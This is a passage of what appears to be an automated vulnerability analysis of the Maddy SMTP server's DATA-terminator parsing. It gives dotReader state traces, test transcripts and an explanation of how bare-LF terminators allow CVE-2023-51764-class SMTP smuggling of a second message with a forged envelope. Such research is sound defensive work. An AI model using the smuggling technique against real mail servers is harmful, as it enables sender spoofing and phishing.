# Maddy SMTP DATA Boundary Parsing — Runtime Behavioral Analysis

**Document**: `blitzy/documentation/maddy_26452dd8dd78.md`
**Scope**: Empirical, evidence-based analysis of how the Maddy SMTP server (and its
underlying `github.com/emersion/go-smtp` library and the Go standard library
`net/textproto.dotReader`) decides that the DATA phase of an SMTP transaction
has ended, and what happens to the remaining bytes on the wire when that
decision is made.

---

## Metadata

| Field | Value |
| --- | --- |
| Repository | `github.com/foxcpp/maddy` |
| Commit | `26452dd` — "target/remote: Rewrite connection part to allow more concurrency" |
| Source branch (human-readable) | `maddy_26452dd8dd78` |
| Working branch (this analysis) | `blitzy-d36d8157-fc5f-4567-bca8-1c27576d5d16` |
| Go module minimum version | `go 1.13` (from `go.mod`) |
| Go toolchain used for testing | `go1.22.2 linux/amd64` |
| go-smtp dependency (pinned) | `github.com/emersion/go-smtp v0.12.1-0.20191206174923-1f576e0ec85c` |
| Go standard library analyzed | `/usr/lib/go-1.22/src/net/textproto/reader.go` (lines 333–445) |
| Test host | Ubuntu 24.04.4 LTS, `127.0.0.1:2525` (backend), `127.0.0.1:2526` (strict proxy) |
| Analysis date | April 2026 |

> **Scope guarantee**: This analysis is purely **observational**. No file inside
> the `foxcpp/maddy` working tree was modified; the only permanent artifact is
> this Markdown document in `blitzy/documentation/`. All temporary Go programs
> used to probe live behavior were created in `/tmp/maddy-test/` and have been
> cleaned up.

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [The Dependency Chain for DATA Boundary Parsing](#the-dependency-chain-for-data-boundary-parsing)
3. [Section 1 — Boundary Terminator Tolerance](#1-boundary-terminator-tolerance)
4. [Section 2 — Near-Miss Boundary Behavior](#2-near-miss-boundary-behavior)
5. [Section 3 — Pipelined Multi-Message Consistency](#3-pipelined-multi-message-consistency)
6. [Section 4 — SMTP Smuggling Exposure (CVE-2023-51764-Class Vulnerability)](#4-smtp-smuggling-exposure-cve-2023-51764-class-vulnerability)
7. [Section 5 — Proxy Interaction Analysis](#5-proxy-interaction-analysis)
8. [Section 6 — Diagnostic Artifacts and Residual Evidence](#6-diagnostic-artifacts-and-residual-evidence)
9. [Section 7 — Static Analysis Corroboration](#7-static-analysis-corroboration)
10. [Section 8 — Recommendations (Observational)](#8-recommendations-observational)
11. [Appendix A — Test Environment](#appendix-a--test-environment)
12. [Appendix B — Complete Protocol Transcripts](#appendix-b--complete-protocol-transcripts)
13. [Appendix C — Hex Dumps of Wire Traffic](#appendix-c--hex-dumps-of-wire-traffic)
14. [Appendix D — dotReader State Machine Visualization](#appendix-d--dotreader-state-machine-visualization)
15. [Appendix E — References](#appendix-e--references)

---

## Executive Summary

The DATA phase of an SMTP transaction ends when the server recognises the
RFC 5321 §4.1.1.4 terminator sequence `<CRLF>.<CRLF>` (`\r\n.\r\n`). The core
finding of this analysis is that **Maddy does not implement this decision
itself**. It defers the decision to the `DotReader()` method of the Go standard
library's `net/textproto` package, which it reaches through a single one-line
call in `github.com/emersion/go-smtp/data.go` (`c.text.DotReader()`). Neither
`go-smtp` nor Maddy applies any additional validation, normalisation, or
terminator-format check around that call.

Because `net/textproto.dotReader` intentionally treats a bare `\n` as
equivalent to `\r\n` for line-ending purposes, Maddy accepts **four distinct
byte sequences** as valid DATA terminators: the canonical `\r\n.\r\n`
(RFC-compliant), the bare-LF `\n.\n`, and the mixed forms `\r\n.\n` and
`\n.\r\n`. All four produce identical 250 OK responses and deliver a
byte-identical (normalised to `\n` line endings) body to `Session.Data()` in
`internal/endpoint/smtp/smtp.go`. Near-miss sequences — a trailing space
(`\r\n. \r\n`), a bare-CR dot (`\r.\r`), and a dot that is not at the start of
a line (`Body.\r\n`) — are correctly treated as body content.

Because the `bufio.Reader` wrapped around the TCP socket is shared between the
DATA phase and the command phase (go-smtp's `handleConn` command loop resumes
reading from exactly the same reader once `handleData` returns), **any bytes
that follow a prematurely-accepted terminator are treated as new SMTP
commands**. This makes Maddy susceptible to the CVE-2023-51764-class SMTP
smuggling attack: a single DATA stream containing the sequence `\n.\n` mid-body
followed by `MAIL FROM`, `RCPT TO`, `DATA`, a second body, and a canonical
terminator produces **two delivered messages with independent sender and
recipient envelopes**. This was empirically confirmed in live testing
(Session 10) where one client DATA stream caused `[SESSION 10] Message #1 accepted`
and `[SESSION 10] Message #2 accepted` log lines with different `from=` values.

A strict front-proxy that only recognises the canonical `\r\n.\r\n` as a DATA
terminator **does not mitigate the attack**. The proxy correctly buffered all
149 bytes of the smuggling payload and wrote them to the backend in a single
`Write()` call, yet the backend still produced two messages (Session 11) with
the same sender/recipient split as the direct attack. This is because the
proxy-to-backend TCP connection still shares a single `bufio.Reader` on the
backend, and the backend's own dotReader terminates early at `\n.\n` regardless
of how the bytes were delivered over the wire.

Pipelined multi-message delivery is consistent across transactions. Three
back-to-back MAIL/RCPT/DATA cycles on a single connection with alternating
terminator styles (canonical, bare-LF, mixed) all completed successfully with
correct sender/recipient isolation (Session 9). There is no boundary wobble,
no buffering artefact, and no state leakage between transactions because
`handleData` creates a fresh `dataReader` via `newDataReader(c)` on every
DATA command.

The smuggling attack is silent. No warning, error, or anomaly is logged when a
bare-LF terminator is recognised or when the tail of a DATA stream is reparsed
as commands. The only observable indicator is two `accepted` events from
`s.log.Msg("accepted", ...)` (smtp.go line 334) where the operator expected
one. The `io_debug` feature, when enabled, captures the raw wire bytes via the
`io.TeeReader` / `io.MultiWriter` installed by `Conn.init()` in go-smtp's
`conn.go`, but by default `io_debug` is off and no forensic trail remains.

## Key Findings at a Glance

| Question | Answer |
| --- | --- |
| Which terminators does Maddy accept? | **Four**: `\r\n.\r\n`, `\n.\n`, `\r\n.\n`, `\n.\r\n`. Only the first is RFC 5321 compliant. |
| Where is the decision made? | In `net/textproto.dotReader.Read()`, not in Maddy or go-smtp code. |
| Is Maddy vulnerable to SMTP smuggling? | **Yes.** CVE-2023-51764-class. One DATA stream can yield two messages. |
| Do near-misses produce correct behaviour? | **Yes.** Dot-space, bare-CR, and mid-line dots are all treated as body content. |
| Is pipelined delivery consistent? | **Yes.** No boundary wobble across back-to-back transactions. |
| Does a strict proxy mitigate? | **No.** The backend still smuggles even when the proxy forwards a single `Write()`. |
| Is the attack visible in logs? | **Silent** by default. Only two `accepted` events betray it; no warning. |

---

## The Dependency Chain for DATA Boundary Parsing

Every DATA byte that reaches a Maddy `Session.Data()` handler passes through a
precise chain of readers. Understanding exactly where each reader sits in the
chain — and which of them makes the "is this the end of the message?" decision
— is the single most important prerequisite for every other answer in this
document. The chain is:

```text
TCP socket (net.Conn)
  │
  ▼
lineLimitReader                       (go-smtp/lengthlimit_reader.go)
  │   — enforces Server.MaxLineLength; counter reset on any '\n'
  │
  ▼
io.TeeReader   (only if io_debug)     (go-smtp/conn.go, Conn.init())
  │   — mirrors wire bytes to Server.Debug
  │
  ▼
textproto.Conn                        (Go stdlib net/textproto)
  │   — wraps the reader in a bufio.Reader; offers ReadLine, ReadResponse,
  │     and DotReader helpers
  │
  ▼
bufio.Reader       ◄── SHARED STATE   (Go stdlib bufio)
  │   — the same buffer is used for both SMTP commands and DATA bytes
  │
  ▼
textproto.dotReader                   (Go stdlib net/textproto/reader.go 333-445)
  │   — THE BOUNDARY DECISION POINT
  │   — six-state FSM: stateBeginLine, stateDot, stateDotCR, stateCR,
  │     stateData, stateEOF
  │   — accepts '\n' as equivalent to '\r\n'
  │   — normalises the body to '\n' line endings in the output
  │
  ▼
dataReader                            (go-smtp/data.go)
  │   — thin wrapper that only enforces Server.MaxMessageBytes
  │   — boundary detection is delegated 100 % to textproto.dotReader
  │
  ▼
Session.Data(r)                       (maddy internal/endpoint/smtp/smtp.go:312)
  │   — wraps r in prepareBody, which uses bufio.NewReader(r) +
  │     textproto.ReadHeader(bufr) + buffer.BufferInMemory(bufr)
  │
  ▼
ioutil.ReadAll                        (internal/buffer/memory.go:27-33)
      — consumes every byte up to dotReader EOF into a []byte
```

Five properties of this chain matter for the rest of this analysis:

1. **The decision point is in the Go standard library, not in Maddy or go-smtp.**
   `go-smtp/data.go`'s `newDataReader` function simply calls
   `c.text.DotReader()` and wraps the returned `*textproto.dotReader` with a
   size-limit counter. The body bytes that emerge from `dotReader.Read()` are
   the bytes that `Session.Data()` ultimately sees. There is no place in
   go-smtp or Maddy that inspects the terminator format.

2. **The dotReader is lenient about line endings.** It was designed for the
   MIME-adjacent RFC 822 family of protocols where robust parsing is a virtue.
   It accepts `\n` as a line ending anywhere a `\r\n` would be accepted, which
   means every one of `\n.\n`, `\r\n.\n`, `\n.\r\n`, and `\r\n.\r\n` is a
   legitimate terminator. A full state-transition trace is given in
   Section 1 and Appendix D.

3. **The `bufio.Reader` is shared state across phases.** The command-phase
   command loop (`handleConn` in `go-smtp/server.go`) and the DATA-phase
   dotReader both pull their bytes from the same `bufio.Reader` instance
   created once by `textproto.NewConn(rwc)` in `Conn.init()`. After
   `Session.Data()` returns, the command loop resumes reading from the same
   underlying reader. Any bytes that the dotReader left in the buffer — for
   example, because it stopped at a premature bare-LF terminator — are
   visible to the command loop and are parsed as SMTP commands.

4. **The `io.Copy(ioutil.Discard, r)` drain after `Session.Data(r)` is a
   no-op whenever the dotReader is already at EOF.** This is the line in
   `go-smtp/conn.go` `handleData()` that an operator might reasonably expect
   to consume the rest of the body. It does not. Once the dotReader sees
   `\n.\n` (or any accepted terminator), it latches into `stateEOF` and
   returns `io.EOF` on every subsequent `Read()`. The `io.Copy` drains zero
   bytes because the dotReader has nothing more to give — even though the
   underlying `bufio.Reader` still contains the smuggled command bytes.

5. **Maddy's own code adds zero terminator validation.** `Session.prepareBody`
   in `internal/endpoint/smtp/smtp.go` (lines 283–310) wraps the dotReader in
   its own `bufio.Reader`, calls `textproto.ReadHeader(bufr)` to split off
   the header, and then hands the rest to `buffer.BufferInMemory(bufr)`
   (which is `ioutil.ReadAll` in `internal/buffer/memory.go` lines 27–33).
   Neither `prepareBody` nor `Session.Data` nor any check/modifier in the
   `msgpipeline` inspects the terminator format. By the time the bytes reach
   `delivery.Body()` and `delivery.Commit()` (smtp.go lines 329–338), the
   terminator decision is already final and unrecoverable.

The remainder of this document treats each of the six investigative questions
in turn, presenting both the static-analysis argument (grounded in the five
properties above) and the live-wire evidence captured from the test harness
described in Appendix A.

---

## 1. Boundary Terminator Tolerance

### 1.1 The RFC 5321 Requirement

RFC 5321 §4.1.1.4 states that the DATA command is terminated by a specific,
unambiguous byte sequence:

> The mail data are terminated by a line containing only a period, that is,
> the character sequence `<CRLF>.<CRLF>`

Where `<CRLF>` is the two-octet sequence `0x0D 0x0A`. The canonical terminator
on the wire is therefore the five bytes `0d 0a 2e 0d 0a`. Any server that
accepts a different terminator is, by the letter of the specification, in
violation.

### 1.2 What Maddy Accepts Empirically

Four distinct byte sequences were tested against a minimal go-smtp-based
server running the exact library version that Maddy depends on
(`github.com/emersion/go-smtp v0.12.1-0.20191206174923-1f576e0ec85c`). All
four produced a 250 OK response, all four caused `Session.Data()` to be
invoked, and all four were normalised identically by the dotReader (`\r\n`
collapsed to `\n`, the terminator stripped).

| # | Wire Terminator | Hex Sequence | Server Response | `Session.Data()` Invoked | Body Length Delivered |
|---|-----------------|--------------|-----------------|--------------------------|----------------------|
| 1 | `\r\n.\r\n` (canonical, RFC 5321) | `0d 0a 2e 0d 0a` | `250 2.0.0 OK: queued` | Yes | 159 bytes |
| 2 | `\n.\n` (bare-LF) | `0a 2e 0a` | `250 2.0.0 OK: queued` | Yes | 145 bytes |
| 3 | `\r\n.\n` (mixed CRLF+LF) | `0d 0a 2e 0a` | `250 2.0.0 OK: queued` | Yes | 128 bytes |
| 4 | `\n.\r\n` (mixed LF+CRLF) | `0a 2e 0d 0a` | `250 2.0.0 OK: queued` | Yes | 128 bytes |

For traceability, each session used a distinct `Subject:` label identifying
the variant under test (`canonical-test`, `bare-lf-test`, `mixed-crlf-lf`,
`mixed-lf-crlf`) and a distinct body paragraph naming the same variant.
The delivered-size column therefore reflects both the terminator-independent
body length AND the per-session label width; see Appendix B.1–B.4 for full
wire transcripts and Appendix C.1–C.4 for byte-accurate hex dumps of the
wire payloads and the delivered buffers.

The key observation is NOT that the four rows have the same byte count
(they do not, because the Subject labels differ in length) but that:

- Every one of the four terminator variants was ACCEPTED — the server
  returned `250 OK: queued` in each case.
- `Session.Data()` was invoked for every variant; the dotReader reached
  `stateEOF` and the message entered the pipeline.
- For any FIXED body content, swapping the terminator form (canonical vs
  bare-LF vs mixed) changes the WIRE byte count but produces an IDENTICAL
  delivered buffer (because CRLF-to-LF normalisation is uniform across all
  four variants, and the terminator itself is always stripped).

A reader that expected the bare-LF variants to be rejected will be
surprised: no error is raised, no warning is logged, and the message is
accepted into the pipeline exactly as if it had been terminated canonically.

### 1.3 Why It Happens — The dotReader State Machine

The decision to accept a given byte sequence as a terminator is made inside
Go's standard library, specifically in `net/textproto/reader.go`
(`/usr/lib/go-1.22/src/net/textproto/reader.go`, lines 333–445). The
`dotReader` type holds a single `state` field of type `dotReaderState` and
advances it through the following six states:

| Constant | Meaning |
|----------|---------|
| `stateBeginLine` | Initial state; reader is at the start of a new line |
| `stateDot` | A `.` has been consumed at the start of a line |
| `stateDotCR` | A `.\r` has been consumed at the start of a line |
| `stateCR` | A `\r` has been consumed (not preceded by `.`) |
| `stateData` | Ordinary body content |
| `stateEOF` | Terminator has been recognised; `Read` returns `io.EOF` thereafter |

The exact transition table, recovered by reading the source directly:

| Current State      | Byte `\n`                | Byte `\r`                        | Byte `.`                        | Other byte                       |
|--------------------|--------------------------|----------------------------------|---------------------------------|----------------------------------|
| `stateBeginLine`   | emit `\n`, → `stateData` | → `stateCR`                      | → `stateDot`                    | emit byte, → `stateData`         |
| `stateDot`         | **→ `stateEOF`**         | **→ `stateDotCR`**               | emit byte (`.`), → `stateData`  | emit byte, → `stateData`         |
| `stateDotCR`       | **→ `stateEOF`**         | unread, emit `\r`, → `stateData` | unread, emit `\r`, → `stateData`| unread, emit `\r`, → `stateData` |
| `stateCR`          | → `stateBeginLine`, emit `\n` | unread, emit `\r`, → `stateData` | unread, emit `\r`, → `stateData`| unread, emit `\r`, → `stateData` |
| `stateData`        | → `stateBeginLine`, emit `\n` | → `stateCR`                      | emit byte                       | emit byte                        |
| `stateEOF`         | (terminal; `Read` returns `io.EOF` on every call) | | | |

Two subtleties in the table warrant explicit clarification so the reader can
predict behaviour without having to re-read the Go source:

1. **`stateBeginLine` + `\n`**: The actual code path sets `state = stateData`
   and falls through to the byte-emit line, so the state AFTER emitting the
   `\n` is `stateData`, not `stateBeginLine`. However, the NEXT byte read in
   `stateData` that is itself a `\n` transitions back to `stateBeginLine`.
   The practical effect for a run of consecutive `\n` bytes is that the
   reader oscillates `stateBeginLine → stateData → stateBeginLine → …`,
   emitting each `\n` along the way. A compact way to read this cell is
   therefore "emit `\n`, effectively at start of next line", but the literal
   transition is to `stateData`.

2. **`stateDot` + "Other byte"**: When the dotReader is in `stateDot` and
   sees a byte that is neither `\r`, `\n`, nor `.`, the code sets
   `state = stateData` and then emits the CURRENT byte (not a literal `.`).
   The leading `.` that got the reader INTO `stateDot` is suppressed — this
   is RFC 5321 §4.5.2 "dot-unstuffing" in action: the first byte of a line
   that is `.` is treated as transparent and removed. In the special case of
   a dot-stuffed line (`..text`), the second byte is itself `.` and so the
   emitted byte IS a `.` — but in all other "other byte" cases (e.g.,
   `. text` where the other byte is a space), the dot is dropped and only
   the subsequent byte is emitted. (Cell summary: "emit byte" = emit whatever
   the current non-special byte happens to be, with the original `.`
   already consumed.)

The two transitions set in bold are the source of the lenience. Observe that
from `stateDot`, a bare `\n` takes the reader directly to `stateEOF` — it
does not have to pass through `stateDotCR` first. Equivalently: any line that
consists of a single `.` followed by either `\n` or `\r\n` will terminate
the data stream, regardless of whether the line is preceded by `\r\n` or by
a bare `\n` or by a lone `\r`.

Concrete traces for each of the four accepted terminator variants, assuming
the dotReader enters each sequence in `stateBeginLine` (which is what happens
immediately after the body has ended with a newline):

```text
Variant 1 — canonical \r\n.\r\n
    Initial state: stateBeginLine (reached via prior \n or \r\n)
    Input: .  → stateDot           (no byte emitted)
    Input: \r → stateDotCR         (no byte emitted)
    Input: \n → stateEOF           (terminator recognised; io.EOF thereafter)

Variant 2 — bare-LF \n.\n
    Assume body ended with ...\n; dotReader is in stateBeginLine.
    Input: .  → stateDot           (no byte emitted)
    Input: \n → stateEOF           (terminator recognised; io.EOF thereafter)

Variant 3 — mixed \r\n.\n  (body ends \r\n, terminator is .\n)
    After \r\n, dotReader is in stateBeginLine (\r takes stateData→stateCR,
    \n in stateCR takes it back to stateBeginLine).
    Input: .  → stateDot
    Input: \n → stateEOF

Variant 4 — mixed \n.\r\n  (body ends \n, terminator is .\r\n)
    After \n, dotReader is in stateBeginLine.
    Input: .  → stateDot
    Input: \r → stateDotCR
    Input: \n → stateEOF
```

### 1.4 Normalisation of Line Endings

A second, related property of the dotReader is that it **normalises CRLF to
LF in the emitted body**. The transition table shows:

- In `stateData`, a `\n` moves to `stateBeginLine` (the `\n` is emitted).
- In `stateData`, a `\r` moves to `stateCR` — no byte is emitted yet.
- In `stateCR`, a `\n` moves to `stateBeginLine` (only the `\n` is emitted;
  the preceding `\r` was swallowed).

Consequently, a body sent with `\r\n` line endings is delivered to
`Session.Data()` with `\n` line endings only. This matters for two reasons:

1. **For any FIXED body content, the delivered byte-for-byte buffer is
   identical regardless of which of the four terminator variants was used.**
   The canonical variant has its CRs stripped during normalisation, the
   mixed variants have their lone `\r` stripped (or were already absent),
   and the bare-LF variant had no CRs to begin with. The hex dump of what
   `Session.Data()` sees is therefore independent of the wire terminator
   form. (In the empirical table above, each session uses a distinct
   `Subject:` label for traceability, so the per-row delivered sizes reflect
   the Subject-label length variation rather than terminator-induced
   difference. If the body content were held fixed across the four rows,
   all four delivered sizes would be identical.)

2. **Downstream processing cannot tell the difference.** Maddy's
   `prepareBody` re-wraps the reader in a `bufio.Reader` and calls
   `textproto.ReadHeader(bufr)` to split off the header block, followed by
   `buffer.BufferInMemory(bufr)` to read the remaining body. Neither of these
   functions receives any signal about the terminator format — they simply
   read until EOF. The smuggling opportunity described in Section 4 is
   therefore invisible to Maddy's own code.

### 1.5 Wire Evidence

The following is an abbreviated client-side transcript for each variant,
captured from the test client `tcli` (see Appendix B for full transcripts
and Appendix C for extended hex dumps):

```text
═══════════════════════════════════════════════════════════════════
Test #1 — Canonical \r\n.\r\n
═══════════════════════════════════════════════════════════════════
C: EHLO test-client\r\n
S: 250-Hello test-client ...\r\n250-PIPELINING\r\n250-8BITMIME\r\n
   250-ENHANCEDSTATUSCODES\r\n250 SIZE 10240000\r\n
C: MAIL FROM:<sender@test.local>\r\n
S: 250 2.0.0 Roger, accepting mail from <sender@test.local>\r\n
C: RCPT TO:<recipient@test.local>\r\n
S: 250 2.0.0 I'll make sure <recipient@test.local> gets this\r\n
C: DATA\r\n
S: 354 Go ahead. End your data with <CR><LF>.<CR><LF>\r\n
C: Subject: canonical-test\r\nFrom: sender@test.local\r\n
C: To: recipient@test.local\r\n\r\n
C: This is the canonical CRLF-terminated message body.\r\n
C: Line two ends with CRLF as well.\r\n.\r\n
S: 250 2.0.0 OK: queued\r\n
C: NOOP\r\n
S: 250 2.0.0 I have sucessfully done nothing\r\n
C: QUIT\r\n
S: 221 2.0.0 Goodnight and good luck\r\n

Server-side: [SESSION 1] DATA received; 159 bytes delivered.

═══════════════════════════════════════════════════════════════════
Test #2 — Bare-LF \n.\n
═══════════════════════════════════════════════════════════════════
C: EHLO test-client\r\n
S: 250-Hello ...\r\n ... 250 SIZE 10240000\r\n
C: MAIL FROM:<sender@test.local>\r\n
S: 250 2.0.0 Roger ...\r\n
C: RCPT TO:<recipient@test.local>\r\n
S: 250 2.0.0 I'll make sure ...\r\n
C: DATA\r\n
S: 354 Go ahead ...\r\n
C: Subject: bare-lf-test\nFrom: sender@test.local\n
C: To: recipient@test.local\n\n
C: This is the bare-LF-terminated message body.\n
C: Line two also uses bare LF.\n.\n
S: 250 2.0.0 OK: queued\r\n
C: NOOP\r\n
S: 250 2.0.0 I have sucessfully done nothing\r\n
C: QUIT\r\n
S: 221 2.0.0 Goodnight and good luck\r\n

Server-side: [SESSION 2] DATA received; 145 bytes delivered.

Observation: the command lines (EHLO, MAIL, RCPT, DATA, NOOP, QUIT) are
still sent with \r\n because go-smtp's parseCmd() expects them to arrive
that way; it is only the body bytes whose line endings we varied. The
per-session delivered byte count differs (159 vs 145) only because each
session uses a distinct Subject label (`canonical-test` is 2 characters
longer than `bare-lf-test`) — the TERMINATOR form does not contribute
to this difference. Were both sessions run with identical body content,
they would deliver byte-identical buffers to `Session.Data()`.
```

### 1.6 Conclusion for Section 1

**Maddy is RFC 5321 §4.1.1.4 non-compliant with respect to DATA termination.**
It accepts a bare-LF terminator (`\n.\n`) as equivalent to the canonical
`\r\n.\r\n`, and likewise accepts the two mixed forms. The non-compliance is
not a bug in Maddy or in go-smtp; it is the documented behaviour of the
Go standard library's `net/textproto.dotReader`. Fixing it at any layer
(Maddy, go-smtp, or the stdlib) is possible in principle but requires a
source-level change; no configuration option exists in the version of Maddy
under study that can restrict the server to the canonical terminator only.

The four-way lenience is the direct cause of every other finding in this
document: it is the mechanism that makes near-miss analysis interesting
(Section 2), that enables pipelined consistency to be demonstrated with
alternating terminator styles (Section 3), that opens the door to SMTP
smuggling (Section 4), and that cannot be closed off at the proxy layer
(Section 5).

---

## 2. Near-Miss Boundary Behavior

Section 1 established that four distinct byte sequences are accepted as
terminators. This section addresses the complementary question: **what about
byte sequences that look like terminators but are not?** Specifically, what
happens when body content contains a dot, a dot-space, a bare-CR, or a
dot-stuffed line? The behaviour matters because the same state-machine
lenience that accepts bare-LF terminators could, in principle, also
mis-classify body content as a terminator. In practice, it does not — the
parser correctly distinguishes these near-misses, for reasons that follow
directly from the transition table in Section 1.3.

### 2.1 The Four Near-Miss Cases Tested

| # | Body Content (key portion) | Wire Bytes (hex) | Expected Behaviour | Observed Behaviour |
|---|----------------------------|-------------------|--------------------|---------------------|
| 1 | Dot-space line: `\r\n. \r\n` | `0d 0a 2e 20 0d 0a` | Not a terminator; leading dot stripped by transparency; space emitted | Not a terminator; delivered as blank line + one space |
| 2 | Bare-CR dot line: `\r.\r` embedded mid-body | `0d 2e 0d` | Not a terminator; bare `\r` not a line ending | Not a terminator; body content preserved |
| 3 | Dot mid-line: `Body.\r\n` (dot not at start of line) | `42 6f 64 79 2e 0d 0a` | Not a terminator; `.` is in `stateData`, not `stateBeginLine` | Not a terminator; `.` delivered as body |
| 4 | Dot-stuffed line: `\r\n..text\r\n` | `0d 0a 2e 2e 74 65 78 74 0d 0a` | Leading dot stripped (RFC 5321 §4.5.2 transparency) | First `.` stripped; `.text` delivered |

All four near-misses behave as RFC 5321 intends. The message terminates only
when the actual canonical (or one of the three lenient) terminator arrives
at the end of the payload.

### 2.2 Trace Analysis — Why Near-Misses Are Correctly Distinguished

#### 2.2.1 Dot-Space `\r\n. \r\n`

Assume the dotReader is in `stateBeginLine` after having consumed the
preceding `\r\n`:

```text
Input: .  → stateDot            (no byte emitted — dot consumed as potential
                                 transparency / terminator prefix)
Input: ␣  → emit ' ' (space), → stateData
                               (the space breaks the terminator pattern;
                                the dot was already consumed on entry to
                                stateDot, and the default branch in
                                stateDot sets state = stateData and then
                                emits the CURRENT byte — the space —
                                not the dot. This is RFC 5321 §4.5.2
                                dot-unstuffing.)
Input: \r → stateCR              (no byte emitted)
Input: \n → stateBeginLine, emit '\n'
                               (the \r was swallowed; only \n is emitted
                                as part of CRLF → LF normalisation)
```

Reading the Go source carefully resolves a subtle point: when the dotReader
is in `stateDot` and the next byte is anything other than `\n`, `\r`, or
`.`, the code sets `d.state = stateData` and then falls through to the
byte-emit line `b[n] = c`, where `c` is the CURRENT byte (the non-special
byte, here a space). The `.` that got us INTO `stateDot` was already
consumed at the `stateBeginLine → stateDot` transition and is NOT emitted.
For the `\r\n. \r\n` sequence, the delivered bytes for that line are just
` \n` (space + normalised newline) — i.e., the body contains a line that
is a single space.

This matches RFC 5321 §4.5.2 "dot-unstuffing" transparency: when a client
sends a body line whose first byte is `.`, the receiver strips that byte.
In the special case where the line contains only `.\r\n` or `.\n`, the
dotReader recognises the terminator instead of stripping. For a dot-space
line sent as `\r\n. \r\n`, the dot is stripped (transparency) and the
remaining content (space + newline) is delivered. The result on the wire
is `. \r\n`, but the delivered body line is just ` \n`. This behaviour
was verified empirically in §B.6 and §C.6.

What matters for **boundary** detection is that this sequence **does not**
cause `stateEOF`. The only way to reach `stateEOF` from `stateDot` is via
`\n` or via `\r` followed by `\n`. A space after the dot rules both out.
The dotReader correctly treats the sequence as body content.

#### 2.2.2 Bare-CR `\r.\r`

This was tested with `\r.\r` embedded in the middle of an otherwise-canonical
body (`...line one.\r.\rline two...\r\n.\r\n`). The dotReader processes it
starting from `stateData`:

```text
Input: e,  → emit (still in stateData)
Input: \r  → stateCR           (no byte emitted — could still be CRLF)
Input: .   → unread '.', emit '\r', → stateData
                               (the '.' did not follow \n; it cannot start a
                                new-line terminator; dotReader un-reads the
                                '.' and re-enters stateData)
Input: .   (re-read) → emit '.' (stateData)
Input: \r  → stateCR
Input: l,  → unread 'l', emit '\r', → stateData
...
```

The key trace step is "in `stateCR`, any non-`\n` byte causes the reader to
un-read that byte, emit the pending `\r`, and re-enter `stateData`." A
bare `\r` never completes a line ending; it must be followed by `\n` to
match `stateCR → stateBeginLine`. The body content is therefore preserved
byte-for-byte, and the `\r.\r` sequence is not misidentified as a
terminator.

#### 2.2.3 Dot Mid-Line `Body.\r\n`

```text
Initial state: stateBeginLine (reached via preceding \n)
Input: B  → emit, → stateData
Input: o  → emit, (stateData)
Input: d  → emit, (stateData)
Input: y  → emit, (stateData)
Input: .  → emit, (stateData)     ← KEY STEP: in stateData, '.' is just
                                     an ordinary byte
Input: \r → stateCR
Input: \n → stateBeginLine
```

The dotReader can only interpret `.` as a potential terminator prefix when
the state is `stateBeginLine`. Any `.` appearing in `stateData` is emitted
as an ordinary byte. This is the exact mechanism by which RFC 5321's
"dot must begin a line" requirement is enforced.

Observation from the live test: the client-side test for this case deliberately
sent `Body.\r\n` and then waited for the server to respond to a subsequent
NOOP. The server did **not** respond, because it had not yet seen the real
terminator — the dotReader was still reading, waiting for the `.\r\n` line
to arrive. The client then sent the real terminator, received 250 OK, and
the NOOP was processed. This confirms that the server correctly treated
`Body.\r\n` as body content and waited for the terminator.

#### 2.2.4 Dot-Stuffed `\r\n..text\r\n`

```text
Initial state: stateBeginLine (reached via preceding \r\n)
Input: .  → stateDot           (no byte emitted — potential terminator)
Input: .  → emit '.', → stateData   ← RFC 5321 §4.5.2 transparency:
                                      the first '.' is swallowed, the
                                      second '.' is emitted as body
Input: t  → emit (stateData)
Input: e  → emit (stateData)
Input: x  → emit (stateData)
Input: t  → emit (stateData)
Input: \r → stateCR
Input: \n → stateBeginLine
```

The first `.` is consumed silently (it is the "transparency dot"), the
second `.` is emitted as the beginning of the body line, and the line
`.text` appears in the delivered body. This is the RFC-mandated behaviour
and the dotReader implements it correctly.

A client that wants to transmit the literal string `.` as a body line must
send `..` on the wire; the dotReader will strip the leading dot and deliver
`.`. A client that wants to transmit the literal string `..` as a body line
must send `...` on the wire; and so on. This "dot-stuffing" is a classical
SMTP transparency mechanism and its correct implementation is important
for interoperability.

### 2.3 What About Bare-CR Followed by `.\n`?

A question that naturally arises is: what happens if a client sends a bare
`\r` followed by `.` followed by `\n`? The trace:

```text
Initial state: stateData (somewhere in body)
Input: \r → stateCR           (no byte emitted)
Input: .  → unread '.', emit '\r', → stateData
                               (because stateCR + any non-\n byte un-reads
                                and re-enters stateData; '.' was un-read)
Input: .  (re-read) → emit '.' (stateData)
Input: \n → stateBeginLine
```

The bare `\r` is **not** treated as a line ending from `stateData`. The
`.` that follows does **not** trigger the potential-terminator path. Only
when the state is `stateBeginLine` (which requires a prior `\n` or `\r\n`)
does a `.` start a terminator probe. A bare `\r` before a `.` does not
produce a terminator.

This was empirically confirmed in Test #5 (`\r.\r` embedded in body): the
body was delivered intact and no premature termination occurred.

### 2.4 Conclusion for Section 2

**The parser correctly treats all four tested near-miss sequences as body
content.** The two requirements that must both hold for a terminator to be
recognised are:

1. The `.` must appear at the start of a line (i.e., the dotReader must be
   in `stateBeginLine` when it consumes the `.`), AND
2. The `.` must be immediately followed by `\n` or `\r\n`.

A `.` preceded by a bare `\r` (without a `\n`), a `.` in the middle of a
line, a `.` followed by a space, and a `..` (dot-stuffed) all fail one or
both of these requirements and are correctly emitted as body content.

This is good news: the lenience of the dotReader is **only** in accepting
bare `\n` as a line ending. It does not extend to misidentifying arbitrary
dot-like sequences as terminators. Applications that embed `.` characters
at arbitrary positions in their bodies (including dotfiles, e-mail
signatures beginning with `--`, or URLs containing dots) are not at risk
of corruption from this lenience.

---

## 3. Pipelined Multi-Message Consistency

### 3.1 Why This Matters

SMTP PIPELINING (RFC 2920) allows a client to send multiple commands back-to-back
without waiting for individual responses. If the DATA boundary decision
is even slightly stateful across transactions — for example, if a byte left
over from a previous DATA phase can influence the next — a pipelined workload
will make the inconsistency visible. The question we need to answer is: given
the lenient boundary recognition established in Section 1, is the boundary
decision **consistent** across successive transactions on the same persistent
connection? Or does some timing, buffering, or state-carryover effect cause
the boundary to shift?

### 3.2 Where PIPELINING Is Advertised

The go-smtp `Server` struct is constructed with a default capability list
that includes `PIPELINING`. In `server.go` the `NewServer` function
initialises `s.caps` to `[]string{"PIPELINING", "8BITMIME",
"ENHANCEDSTATUSCODES"}`. The `PIPELINING` capability therefore appears in
every EHLO response by default, and any client that wishes to pipeline may
do so. Maddy does not override this default in
`internal/endpoint/smtp/smtp.go`, so the capability is exposed on every
production Maddy listener.

